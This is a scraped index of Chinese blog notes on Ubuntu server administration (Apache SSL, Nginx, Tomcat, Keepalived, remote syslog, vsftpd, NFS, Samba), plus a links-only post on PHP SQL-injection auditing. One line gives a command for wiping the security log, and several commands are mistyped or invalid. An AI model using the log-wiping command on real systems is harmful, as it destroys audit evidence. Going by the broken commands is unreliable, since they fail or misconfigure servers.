传输过程中的CIA (机密性、完整性、可用性)，但是不提供应用层安全 # /etc/apache2/sites-available/default-ssl.conf sudo a2ensite default-ssl # 开始ssl加密(默认未启动) sudo a2ebmod ssl # 默认未启动 _default_:443 # 未指定虚拟主机情况下的443端口访问, 默认是443(除了其他指定了虚拟主机名的，未指定的就访问到这里) SSLEngine on # 开启SSl/TSL SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem # 证书文件(默认已经自带了一张证书) SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt # 证书的加密链文件 SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl # 证书吊销列表 SSLVerifyClient require # 要求客户端提供证书(不可抵赖性) \u003cFilesMatch \"\\.(cgi|shtml|phtml|php)$\"\u003e # 基于文件类型，设置不同环境变量进行加密 SSLOptions +StdEnvVars \u003c/FilesMatch\u003e \u003cDirectory /usr/lib/cgi-bin\u003e # 对指定目录 SSLOptions +StdEnvVars # 标准环境变量 \u003c/Directory\u003e ssl-unclean-shutdown # 只是服务器端向客户端断开连接(追求速度) ssl-accurate-shutdown # 服务器端与客户端的连接端口了，客户端还有向服务端再确认(追求稳定性) nokeepalive ssl-unclean-shutdown downgrade-1.0 force-response-1.0 # 降级响应 # 还可以按自己需要... ## 启用并重启服","date":"2020-04-28","objectID":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/:3:0","tags":["Linux","Ubuntu","Web服务","Apache","Nginx","Tomcat","反向代理"],"title":"ubuntu server-Web服务","uri":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Keepalived 高可用的一种解决方案：Keepalived 实现高可用(HA) 在服务器组内漂移的VIP（多台服务器实现一个组，但也是一个域名，解析到一个ip） Master独占VIP，其他Server检查Master可用性 Keepalives并非专门针对Apache而设计 常用于负载均衡技术环境 组内服务器应提供相同内容和配置 组内不同服务器有优先级，多个服务器共用一个漂移的ip地址(VIP)，处于正常状态的服务器叫Maste 安装 sudo apt-get install keepalived # 因为无配置，所有默认启动失败 /etc/keepalived/keepalived.conf # 配置文件（需要创建） 配置文件： # 可选配置项，但是一般建议配置 global_defs { notification_email { myemail@mycompany.com # 发送邮件给谁 } notification_email_from keepalives@mycompany smtp_server 192.168.1.150 smtp_connect_timeout 30 router_id mycompany_web_prod } # 关键配置 # 1号配置实例 vrrp_instance VI_1 { smtp_alter interface enp0s3 # 网卡接口优先级 virtual_router_id 51 # 定义服务器组 priority 100 # 优先级(自己定义，保证顺序即可) advert_int 5 # 周期性通告的间隔时间 virtual_ipaddress { 192.168.1.200 # VIP（DHCP以外） } } # 重启服务 systemctl start keepalived systemctl status -l keeplived # 网卡绑定VIP ip a 等待30s # 安装第二台服务器，并进行类似的配置(优先级修改,vip地址填写一样的) # 模拟切换 systemctl stop keepalived systemctl start keepalived 不仅可以配合Apache使用，还可配合其他使用 ","date":"2020-04-28","objectID":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/:4:0","tags":["Linux","Ubuntu","Web服务","Apache","Nginx","Tomcat","反向代理"],"title":"ubuntu server-Web服务","uri":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Ubuntu 18.04新特性 哈哈哈，前几天20.04都已经正式发布了，我听课进度太慢 内核是关键 网络配置 多个地址，要用逗号分隔 重启服务：`sudo netplan apply` 桥接的物理网卡设置为没有ip 桌面端： # ifconfig / ifup / if down 已经默认不安装了 # 对应上面 ip link set eth0 up / ip link set eth0 down networkctl命令 # 此命令地位更加突出 networkctl status / networkctl status eth0 # 查看不同网卡的状态和详细信息 ip命令 ip link sudo ip link ens33 down # down掉, 相当于ifup sudo ip link ens33 up # 启动网卡, 相当于 ifdown ip link ls ens33 # 查看网卡的link信息 ip -s -d link ls ens33 # 查看网卡的link信息(更详细) ip -s -s -d link ls ens33 # 查看网卡的link信息(更更详细) ip link set dev ens33 mtu 1500 # 修改MTU ip link set dev ens33 address 00:11:22:33:44:55 # 修改MAC ip addr ip addr # ip a ip addr show # 跟上面没什么差别 ip addr add dev ens33 192.168.1.10/24 # 手动给网卡添加ip ip addr del dev ens33 192.168.1.10/24 # 手动给网卡删除ip ip addr fulsh dev ens33 # 清除网卡信息 ip route ip route show # 查看路由信息 ip route ip route get 1.1.1.1 # 查看到达指定目的ip，计算要经过的路由 sudo ip route default via 192.168.1.2 # 添加默认路由(网关地址) sudo ip route dev ens33 2.0.0.0/8 via 192.168.1.1 # 指定去往某个网络，都要经过1.1这个路由，并指定网卡进行转发 ip maddress # 组播地址 ip maddress # 查看所有网卡都属于哪个组播地址 ip maddress ls ens33 # 查看指定网卡属于哪个组播地址 ip maddress add 33:33:00:00:00:01 dev ens33 # 把哪个网卡加入到某个组播地址 ip neighbor 查arp缓存 # 查看 ip neigh ip -s -s neighbor show # 手动绑定ip与mac地址（防止arp欺骗） lladdr即逻辑链路层地址， perm是永久生效 ip neighbor add dev ens33 192.168.0.131 lladdr 00:11:22:33:44:55 nud perm ip monitor 监视网络里面地址等解析的变化 ip monitor all # 有着不同的状态 ","date":"2020-04-28","objectID":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/:5:0","tags":["Linux","Ubuntu","Web服务","Apache","Nginx","Tomcat","反向代理"],"title":"ubuntu server-Web服务","uri":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Nginx 开源，轻量，快速，可扩展的Web服务器 Github, Netflix, Wordpress都基于Nginx 但是可配置能力弱于Apache 适用于大流量，高并发环境（稳定快速，占用资源少–C10K问题） 在Top 1000个网站中使用率最高 Apache基于线程 基于进程(运行中的文件就叫进程)消耗资源多 同进程下的多线程共享内存（一损俱损） Nginx使用事件驱动的架构 新客户端请求时不创建新的进程/线程 事件处理器处理请求任务 更少的处理时间，更少的内存消耗 Apache与Nginx共用 Apache处理动态内容 Nginx处理静态内容 安装 sudo apt install nginx # 配置文件在 /etc/nginx 配置文件 # /etc/nginx # 主配置文件 nginx.conf # 虚拟主机配置文件 sites-available sites-enabled # 启用的，是个链接 snippets # 可以复用的片段 主配置文件 # /etc/nginx/nginx.conf user www-data; # 用户 worker_processes auto; # 进程数 include /etc/nginx/modules-enabled/*.conf; # 引入的模块配置 events { worker_connections 768; # 每个进程最大的并发连接数 # multi_accept on; } http { sendfile on; # 对内核 静态资源的访问速度(都要开着) tcp_nopush on; # 优化了对tcp协议栈性能(优化了数据包的大小,多个小包变成大包再发) tcp_nodelay on; # 与上面的参数相反(从发包的延时进行优化,来一个包就发) keepalive_timeout 65; # 没一个TCP连接最大的保活的时间 types_hash_max_size 2048; # MIME类型镜头内容hash表大小 ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } 虚拟主机配置文件 ip和端口一样，使用不同域名来指向不同站点 # /etc/nginx/sites-available/ # 可用站点 # /etc/nginx/sites-enabled/ # 已启用站点 # /etc/nginx/sites-available/default server{ listen 80 default_server; # 侦听的端口 root /var/www/htmll; # 根目录 index index.html index.htm index.nginx-debian.html; # 索引文件 server_name www.xpsshuai.cn; # 主机名(域名) } location / { # 主url # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; # 资源没有就404 } 新建虚拟主机(Server Blocks)实例 Nginx中叫服务器块，但东西跟Apache中虚拟主机是一样的 sudo mkdir /var/www/qq.com # 每个单独的Server Block一个配置文件 sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/qq.com sudo vim /etc/nginx/sites-available/qq.com # 内容 server{ listen 80; # 因为这里都侦听80端口，所以为了和默认站点区分，要指定不同域名 server_name www.qqq.com; root /var/www/qq.com; } # 其他配置项可以取消注释自行配置 location ~ /\\.ht { # 这个建议启用，以..开头,以ht结尾的你我们就拒绝访问--\u003e当然也可以增加更多策略 deny all; } # 创建启用的符号链接(Apache是site2enable，这里没有专门的命令) sudo ln -s /etc/nginx/sites-available/qq.com /etc/nginx/sites-enabled/qq.com # 重启 sudo systemctl restart nginx # 访问域名，就会访问到qq.com，因为请求中的host字段是不一样的 # 其他站点同上 Nginx支持PHP WebServer本身只是提供资源的，必须配合php等脚本才能进行逻辑的运算 1.安装fastCGI process manager(FPM) –\u003e 就能配合Nginx配合进行处理(Nginx把接收到的请求转发给php处理) sudo apt install php-fpm # 安装 # 查看位置 ls /var/run/php/ /var/run/php/php7.2-fpm.sock # 进程名称(记住路径) # 验证 php -v 2.配置Nginx # 修改配置 sudo vim /etc/nginx/sites-available/qq.com location ~ \\.php$ { # 匹配所有访问.php的请求 include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # 意思是: 把所有访问.php的拓展名的资源，都转发给这里pass的php进程 } # 还有，索引页面也要添加 index.php 3.配置PHP # sudo vim /etc/php/7.2/fpm/php.ini # 这里只简单讲几个配置 cgi.fix_pathinfo=0 # 必须修改为0, 安全 file_uploads = On # 如果不需要就关掉，看自己需求 max_file_uploads = 20 # 限制单个文件上传大小 allow_url_fopen = On # 是否允许文件包含(如果没业务需要，建议关闭) allow_url_include = Off memory_limit = 128M # 指定内存大小(最小128M,看业务需求) 4.重新加载 sudo nginx -t sudo systemctl reload nginx # 重启php sudo systemctl restart php7.2-fpm 5.重新访问php页面，查看是否正确解析 Nginx支持SSL 自签名证书 (自己测试或者不需要那么安全的情况下) –\u003e 机密性和完整性可以保证，但是身份认证是不会被公网所信任的 # x509标准格式的, 私钥是绝对不能泄漏的, 后面是绑定的一个证书 sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/qq.key -out /etc/ssl/certs/qq.pem # 一旦域名绑定了证书，就必须通过这个域名来访问 # 若向CA证书颁发机构申请证书方法 同上Apache 服务块配置 # sudo vim /etc/nginx/sites-available/qq.com server { listen 443 ssl; # 443端口是 ssl, 通过https访问 server_name www.qqq.com; ssl_certificate /etc/ssl/certs/qq.pem; ssl_certificate_key /etc/ssl/private/qq.key; root /var/www/qq.com } # 重启服务 systemctl restart nginx # 访问https://xxxxxx 会发现浏览器会提示证书不信任 Let’s encrypt 第三方的https的开源的免费证书颁发机构，向他来申请证书 1.安装 sudo add-apt-repository ppa:certbot/certbot # 添加仓库 sudo apt update sudo apt install cerbot # 客户端程序(简化了申请流程) sudo apt install python-cerbot-nginx 2.使用方法： # 前提 域名正常解析、设置好虚拟主机 # 2.1申请证书 (--nginx意思是给nginx用的， -d是域名,还有子域名) , -m是管理员邮箱 sudo certbot --nginx -d example.com -d www.example.com -m admin@example.com # 证书存放位置 /etc/letsencrypt/live # 2.2修改自己配置文件中证书的位置 # sudo vim /etc/nginx/sites-available/qq.com ssl_certificate # 2.3 手动证书更新(因为默认证书有效期是90天) sudo c","date":"2020-04-28","objectID":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/:6:0","tags":["Linux","Ubuntu","Web服务","Apache","Nginx","Tomcat","反向代理"],"title":"ubuntu server-Web服务","uri":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Tomcat Tomcat是由Apache组织开发的一个Servlet(Server Applet)容器 实现对servlet, JSP, JAVA Socket等支持 包含http服务器 作为中间件使用 可与Nginx结合使用(只用Tomcat的话, 抗压能力强) servlet是优于CGI的方式的 安装 open jdk 一般tomcat和java配合较多 jdk是开发环境，jre是运行环境 sudo apt install default-jdk #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk 安装 oracle jdk 安装 sudo apt install software-properties-common -y sudo add-apt-repository ppa:webupd8team/java sudo apt install oracle-java8-installer -y java版本选择 sudo update-alternatives --config java sudo update-alternatives --config javac java --version 或者手动下载oracle jdk包 官方库安装tomcat # ubuntu中收录的8 sudo apt install tomcat8 sudo apt install tomcat8-docs sudo apt install tomcat8-admin sudo apt install tomcat8-examples # tomcat默认不是主要作为WebServer的，一般是配合Apache和Nginx，所以默认使用8080端口 手动安装tomcat 适用于指定具体版本 1.先安装jdk sudo apt install default-jdk #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk # 验证 java --version sudo useradd -m -U -d /opt/tomcat -s /bin/false tomcat # 创建tomcat帐号（home放在opt下面） 2.再下载安装包 3.移动到/opt/tomcat目录 mv apache-tomcat-8.5.31 /opt/tomcat/ 4.修改该文件递归的属主属组改为新建的tomcat用户 # 建议建立符号链接 sudo ln -s /opt/tomcat/apache-tomcat-8.5.31 /opt/tomcat/latest # 把新版本添加链接即可(版本更新之后不需要更改配置文件，配置文件都配置latest,而只需把latest修改指向即可) sudo chown -R tomcat:/opt/tomcat sudo chmod +x /opt/tomcat/latest/bin/*.sh # sudo chmod +x /opt/tomcat/apache-tomcat-8.5.31/bin/*.sh 手动创建systemd管理文件(手动安装就没有systemd的后台管理文件) /etc/systemd/system/ sudo vim tomcat.service 配置内容如下 6.启动服务 # 重新reload sudo systemctl daemon-reload # 启动tomcat sudo systemctl start tomcat sudo systemctl status tomcat # 设置开机启动启动 sudo systemctl enable tomcat 7.Web管理接口配置 # http://ip:8080/manager/ # tomcat管理页面，默认是只允许本机访问的 ## 1.若想开启，就需进行配置（这里指定允许某个ip访问） sudo vim /opt/tomcat/latest/conf/tomcat-user.xml # 自动安装tomcat后的路径在/etc \u003ctomcat-user\u003e \u003crole rolename=\"admin-gui\"/\u003e # 定义两个角色 \u003crole rolename=\"manager-gui\"/\u003e \u003cuser username=\"admin\" password=\"qwe123\" roles=\"admin-gui, manager-gui\"/\u003e # 定义用户 \u003c/tomcat-user\u003e ## 2.指定登录主机 # sudo vim /opt/tomcat/latest/webapps/manager/META-INF/context.xml # 自动安装tomcat后的路径自己找 如下图(懒得弄格式了) # sudo vim /opt/tomcat/latest/webapps/host-manager/META-INF/context.xml 这是管理主机的配置文件 ## 3.重启服务，然后测试 systemctl restart tomcat8 xxx:8080/manager/html # 管理页面就可以部署war包等操 xxx:8080/host-manager/html ","date":"2020-04-28","objectID":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/:7:0","tags":["Linux","Ubuntu","Web服务","Apache","Nginx","Tomcat","反向代理"],"title":"ubuntu server-Web服务","uri":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/"},{"categories":["渗透测试"],"content":"仅仅是简单把网上的文章放在一起，方便自己学习 https://www.cnblogs.com/xiaozi/p/5538369.html https://www.cnblogs.com/xiaozi/p/5538372.html https://www.cnblogs.com/xiaozi/p/5538374.html http://www.mamicode.com/info-detail-1391858.html https://www.cnblogs.com/xiaozi/p/5538380.html https://www.cnblogs.com/xiaozi/p/5538382.html https://www.cnblogs.com/chunguang/p/5583875.html ","date":"2020-04-17","objectID":"/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E6%8C%96%E6%8E%98sql%E6%B3%A8%E5%85%A5-%E9%9B%86%E5%90%88/:0:0","tags":["安全","代码审计"],"title":"【PHP代码审计】 那些年我们一起挖掘SQL注入--集合","uri":"/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E6%8C%96%E6%8E%98sql%E6%B3%A8%E5%85%A5-%E9%9B%86%E5%90%88/"},{"categories":["Linux"],"content":"日志的异地备份 日志服务器的建立尤其重要 这里使用Centos的登录日志做实验 tail -f /var/log/secure 实时查看日志变化 echo \" \" \u003e var/log/secure 最简单的清理日志 常见日志文件 /var/log/messages 大多数系统日志信息记录在此处 /var/log/secure 安全和身份认证相关的信息和错误的日志文件 /var/log/mallog 与邮件服务器相关的日志文件 /var/log/cron 与定时任务相关的日志文件 /var/log/boot.log 与系统启动有关的日志文件 发送方： 考虑问题 1.我发送什么信息表到日志服务器 2.考虑发送到ip哪个端口 3.使用什么协议 配置 配置文件 vim /etc/rsyslog.conf # 这里配置登录日志， 指定日志类别和等级，协议和端口 ### begin forwarding rule ### #*.* @@remote-host:514 @@代表使用TCP authpriv.* @@192.168.0.111:514 ### Note： # 1.暂时关闭防火墙 setup # 关闭防火墙 iptables -nL # 查看一下 # 2.关闭SELinux setenforce 0 getenforce # 重启rsyslog 服务 接收方： 考虑问题 1.收谁的日志 2.收完存哪 3.用什么协议 配置 配置文件 vim /etc/rsyslog.conf # 指定协议和端口 # Provides TCP syslog reception $ModLoad imtcp $InputTCPServerRun 514 # 收谁的，存哪 # 按照ip地址来收 :fromhost-ip, isequal, \"192.168.0.100\" /var/log/client_log/192.168.0.100.log # 重启rsyslog 服务 netstat -antlp |grep 514 # 查看端口是否开始监听了 完成 ","date":"2020-04-16","objectID":"/linux%E6%97%A5%E5%BF%97%E5%BC%82%E5%9C%B0%E5%A4%87%E4%BB%BD/:1:0","tags":["Linux","日志","异地备份"],"title":"Linux日志异地备份","uri":"/linux%E6%97%A5%E5%BF%97%E5%BC%82%E5%9C%B0%E5%A4%87%E4%BB%BD/"},{"categories":["Linux"],"content":"文件服务 我的就是你的 - 你的还是你的 网络诞生最初的动因是去中心化和资源共享 文件是初期最主要的资源共享形式（把文件存放在集中的位置供大家访问） 去中心化是另外一个话题 早期的军事需求 现在的信任需求 ","date":"2020-04-14","objectID":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/:0:0","tags":["Linux","ubuntu","文件服务"],"title":"ubuntu server-文件服务","uri":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"FTP服务 最古老的就是FTP 产生于安全出现之前 明文传输一切 目前主要用于公开提供的文件下载服务(目前还没消亡) 使用简单、兼容性好 还有SFTP、FTPS等 FTP服务端软件 Server U vsftpd Proftpd 为了安全考虑 独立部署于企业防火墙之外 只读挂载存储或采用只读存储设备(CD / DVD) ","date":"2020-04-14","objectID":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/:1:0","tags":["Linux","ubuntu","文件服务"],"title":"ubuntu server-文件服务","uri":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"vsftp安装和配置和管理 vsftpd – 灵活、安全的FTP服务端软件 安装 sudo apt install vsftpd # 安装过程中生成ftp账号（anonymous） 主目录在：/srv/ftp # 默认是21端口进行会话 FTP账号 # 安装完之后会自动创建一个ftp账号（这个账号是不能使用shell和登录机器 ） /etc/passwd # bin/false 表示不能使用shell /etc/shadow # * 表示不能使用终端 /srv/ftp # ftp用户主目录 配置 两种配置模式 anonymous # 匿名模式（适用于公开共享文件） -- vsftpd安装好之后是默认禁用匿名登陆的 Standard # 认证模式 常见FTP客户端 # 用哪个账号登录，看到的文件就是哪个用户的主目录 # 1.使用命令行连接ftp服务器 ftp 192.168.1.130 # 2.浏览器 ftp://192.168.111.130 # 3.ftp客户端访问程序（FileZilla） # 4.文件同步客户端软件 1.匿名登录 配置文件位置 /etc/vsftpd.conf # 主配置文件 开启匿名模式 sudo vim /etc/vsftpd.conf # 修改内容为 anonymous_enable=YES # 启用匿名账号登录 local_enable=NO # 禁用认证用户登录 # 重启vsftpd服务，检查状态 然后使用账号anonymous登录(命令行需要,其他方式不用)，密码不用输即可() 看到的目录是`/srv/ftp/` 开启匿名账号上传 默认：匿名账号是不允许匿名上传的 sudo vim /etc/vsftpd.conf # 修改内容 write_enable=YES # 全局设置（以下配置生效的依赖） anon_upload_enable=YES # 允许匿名上传文件 anon_mkdir_write_enable=YES # 允许匿名创建目录 # 重启服务，检查状态 sudo systemctl restart vsftpd.service 但是还是不能上传的（因为vsftpd强制禁止在根目录下匿名上传） Note： ftp的主目录是不能进行上传文件的，因为这个目录对同组用户没有写的权限(`ls -ld`查看当前目录的权限)，就算你chmod修改了权限也是不行的 【解决办法】:在根目录新建文件然后上传 sudo mkdir /srv/ftp/upload # 创建上传目录 sudo chown ftp:ftp /srv/ftp/upload # 配置新建文件系统属主数组 # 继续新增配置 /etc/vsftpd.conf anon_umask=022 # 上传文件权限掩码(让上传的文件配置不同的权限 -- 看自己需要来配置) anon_other_wrote_enable=YES # 允许删除和重命名(否则删除不了也无法重命名) 修改FTP主目录 sudo mkdir /srv/files/ftp sudo chown -d /srv/files/ftp ftp 文件传输日志 默认是开启的，可以查看恶意文件上传记录 # sudo vim /etc/vsftpd.conf xferlog_enable=YES # 默认开启 xferlog_file=/var/log/vsftpd.log # 默认日志存放位置(注释不注释他都默认往里面写，可修改) # 如果修改，重启服务 其他配置 idle_session_timeout=600 # 会话超时时长 no_anon_password=YES # 命令行登录禁用密码提示 hide_ids=YES # 显示属主/数组名称，而不显示uid和gid(uid会比较敏感) # 重启服务 端口 会话指令 -\u003e TCP 21端口 数据传输模式 主动模式（受客户端防火墙影响）– 客户端随机产生一个端口，告诉服务器 -\u003e服务端只使用 20端口 被动模式 （兼容性好，建议使用） – 服务端告诉客户端使用哪个端口传输 # 用什么模式，客户端说了算 # 都是客户端随机产生一个端口，告诉服务端 # 被动模式连接 ftp -p 192.168.0.130 限定被动模式数据通信端口 # sudo vim /etc/vsftpd.conf 新增配置 # 开放一个端口的范围(尽量少开) pasv_min_port=40001 pasv_max_port=40101 然后在服务器端边界防火墙上开放上述100个端口 2.身份认证登录 身份认证登录TFP 安装之后的默认配置 不能上传 可回溯到根目录（存在安全隐患!!! –\u003e 使用chroot来解决） chroot chroot 将所有登录用户锁定在自己的主目录里（防止目录回溯） # 配置文件 sudo vim /etc/vsftpd.conf # 全局的配置参数(对所有用户) chroot_local_user=YES # 但是chroot的根目录不能是可写的 # 重启服务 # 默认主目录可写， 但是chroot的根目录不能是可写的，vsftp的禁止用户登录，好猫短 ————\u003e 怎么办呢？看下面 （接上文）两种解决办法: 1.为FTP登录指定新的主目录（建议使用） sudo mkdir ~/ftp \u0026\u0026 chmod -w ftp # 新建主目录，并删除写入权限 # sudo vim /etc/vsftpd.conf local_root=/home/xps/ftp # 客户端只能看到这个目录里面，跳不出去 2.允许根目录写入（不建议，存在安全风险） # 配置文件 sudo vim /etc/vsftpd.conf write_enable=YES local_root=/home/xps allow_writeable_chroot=YES chroot 将指定登录用户锁定在自己的主目录里（防止目录回溯） # 配置文件 sudo vim /etc/vsftpd.conf # chroot_local_user=YES # 注释掉前面配置的全局的配置项 # 启用用户列表功能 chroot_list_enable=YES # 如果chroot_local_user=YES也开启了，就起了相反的作用(除了指定列表里面的用户之外, 都锁定在主目录里) # 指定用户列表文件 chroot_list_file=/etc/vsftpd.chroot_list # 编辑用户账号列表 vim /etc/vsftpd/chroot_list # 添加用户 xps ftp # 重启服务 禁止指定FTP登录账号 /etc/ftpusers # 默认禁止FTP登录账号(将用户加入进去) 上传文件权限掩码 # 跟匿名用户的配置是类似的 local_umask=022 文件同步客户端 自动把我电脑的新的文件，上传到FTP服务器(类似于备份) – 有一些第三方软件(ubuntu自带的同步软件backup等) ","date":"2020-04-14","objectID":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/:2:0","tags":["Linux","ubuntu","文件服务"],"title":"ubuntu server-文件服务","uri":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"FTP安全 1.FTPS: FTP over Secure Socket Layer(SSL) 账号无需shell登录权限 基于证书的加密 开启FTPS： # 安全性--指的是在数据传输过程中不会被别人嗅探 ssl_enable=YES # 启动FTPS rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem # 公钥 rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key # 私钥 # 重启服务 # 然后再连接的时候就是加密的了(浏览器需要ftps://ip) # 怎么加密的呢? # 简单来说：安装FTP时候默认会生成一对公钥和私钥 # 不建议使用安装FTP时候默认生成的证书，建议手动生成(每个应用一个证书, 每个证书有效期一两年) 手动生成证书 –\u003e 替换默认证书(安全考虑)： 1.生成秘钥文件 # 使用ssl的一个开源组件openssl openssl genrsa -des3 -out ftp.key 4096 # 1024的已经不安全了 # 然后设置密码保护 2.生成不加密的秘钥文件 # 先还原为明文的密钥对 openssl rsa -in ftp.key -out ftp.key.insecure # 用完就删掉这个insecure文件 # 改名(这是加密的) mv ftp.key server.key.secure # 改名(这是明文的) mv server.key.insecure ftp.key 3.生成证书请求文件(使用上面的明文秘钥) – 实验使用的自签名证书 openssl req -new -key ftp.key -out ftp.csr # 然后输入一些证书的信息 这里使用自签名证书(生产环境建议由证书颁发机构前面生成证书) 3.生成自签名证书 openssl x509 -req -days 365 -in ftp.csr -signkey ftp.key -out ftp.pem # -days 365有效期 4.部署证书 # ftp.key放到一个更安全的目录去 sudo cp ftp.key /etc/ssl/private/ # 此目录root才能看 sudo cp ftp.pem /etc/ssl/certs/ 5.修改/etc/vsftpd.cong中的key和公钥为刚才手动生成的证书， 然后重启服务 上面的操作也可以合并为一条命令 openssl x509 -req -node -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/private/vsftpd.pem 2.SFTP: 基于SSH加密隧道传输文件 账号需要shell登录权限（可设置禁止权限） 远程登录那一章已经学了 ","date":"2020-04-14","objectID":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/:3:0","tags":["Linux","ubuntu","文件服务"],"title":"ubuntu server-文件服务","uri":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"NFS服务 适用于类UNIX系统 NFS – Network File System 最早由SUN公司开发 类unix平台最主要的文件共享方法 基于RPC(Remote Procedure Call)协议 NFS是一个RPC Server （v3 、v4） 协议本身不加密，可结合SSH，Kerberos实现加密 隐藏式身份验证（难点） 权限配置是关键 服务端口: TCP 2049 安装 sudo apt-get install nfs-kernel-server # 服务端 sudo apt-get install nfs-common # 客户端 # 安装完，服务已经都启动了 ps -ef |grep rpc ps -ef |grep nfs 进程 rpcbind # RPC服务进程 nfsd # NFS主进程(身份识别) mountd # 根据 /etc/exports 配置验证权限 lockd # 锁定（需C/S同时启用） statd # 一致性（需C/S同时启用） 身份识别 客户端提供 UID / GID (与用户名、组名无关) 服务器按客户端UID /GID 赋权 若服务器无客户端UID / GID账号，则将客户端映射为匿名账号 nobody / nogroup (uid: 65534) 客户端使用root账号（UID 0），默认映射为匿名账号 可修改配置文件映射 UID 0 为服务端 ROOT （存在安全隐患） 如果客户端uid和服务端uid相同，则客户端会获得服务器端账号的权限；若不同，则客户端获取服务端的nobody权限(除非客户端是root账号,且服务端启用了客户端的root映射为服务端的root) 隐式的身份认证 权限体系 1.共享权限 2.文件系统权限 配置 sudo vim /etc/exports # 主配置文件 # 内容：共享目录,谁可以访问我, 权限，(sync是数据先写到内存在硬盘可靠,async是写到内存然后写的硬盘速度快)，no_subtree_check是不进行子目录的检查(建议使用) /exports/public 192.168.1.0/24(rw,sync,no_subtree_check) # 允许访问的范围可以使用通配符： *.lab.com no_root_squash # 禁用root默认映射为nobody(加在上面括号中的配置中) # sudo mkdir -p /exports/public # 创建共享目录 sudo chown nobody:nogroup /exports/public # 设置权限 sudo systemctl restart nfs-kernel-server # 重启服务 sudo exportfs # 查看共享目录 cat /var/lib/nfs/etab # 共享目录 cat /var/lib/nfs/xtab # 客户端信息 共享权限 ro/rw # 只读/只写 sync / async # 同步写入硬盘 / 暂存于内存中 all_squash # 所有用户全部映射为nobody anonuid / anongid # 支付那个匿名ID（默认65534） secure / insecure # 使用1024以下/以上端口 hide / no_hide # 共享 / 不共享NFS子目录 客户端挂载 # 和本地挂载设备一样(挂载到本地，但是访问是通过网络流量的) sudo mount 192.168.0.30:/export/public my_nfs/ # 写入文件的话 1.临时获取root权限，会默认转为nobody sudo xxxxx 2. chmod修改其他用户的权限后，直接写入即可(客户端的uid与服务端的uid相同的话) 启动挂载 风险：nfs服务器如果出现问题，本地机器启动就会特别慢 # sudo vim /etc/fstab 192.168.1.30:/home /my_nfs/ nfs no_auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0 # 建议 no_auto 不自动挂载 其他命令 rpcinfo -p 192.168.1.30 # 查询RPC服务注册状态(客户端与服务端都可以执行) tail /var/log/kern.log # 服务器日志 showmount -e localhost # 显示共享目录 df -h # 客户端查看挂载 企业环境有统一域名和身份验证时 # 也要配置这个 sudo vim /etc/idpamd.conf Domain = lab.com Windows客户端 企业版才可以添加nfs的支持 ","date":"2020-04-14","objectID":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/:4:0","tags":["Linux","ubuntu","文件服务"],"title":"ubuntu server-文件服务","uri":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"SAMBA服务 SMB / CIFS 协议 全称Server message block / Common internet file system 最早由IBM研发，后由微软采用并不断完善 Windows文件和打印共享（之前使用的SMB协议, 后来改进为cifs协议） 端口：TCP 139(局域网), 445() / UDP 137(用来名称解析), 138 Samba 是开源世界逆向了SMB协议后打造的兼容微软SMB的文件共享服务 Samba还有其他功能、用途和使用场景 功能不仅限于此，但最常用的用途，还是做文件共享服务： NFS只适用于类Unix系统环境 Samba适用与Windows、Linux混合环境的文件共享需要 Samba实现了CIFS服务的四个基本功能 1.文件和打印共享 2.认证和授权 3.名称解析 4.服务宣告(browsing) 传输协议： NetBIOS # 局域网 NetBIOS over TCP/IP # 跨网段(把NetBIOS数据包封装之后跨网络传输) 后台进程 Smbd # 文件共享主进程 TCP: 139/445 Nmbd # WINS通信、名称解析 UDP: 137/138 Winbindd # 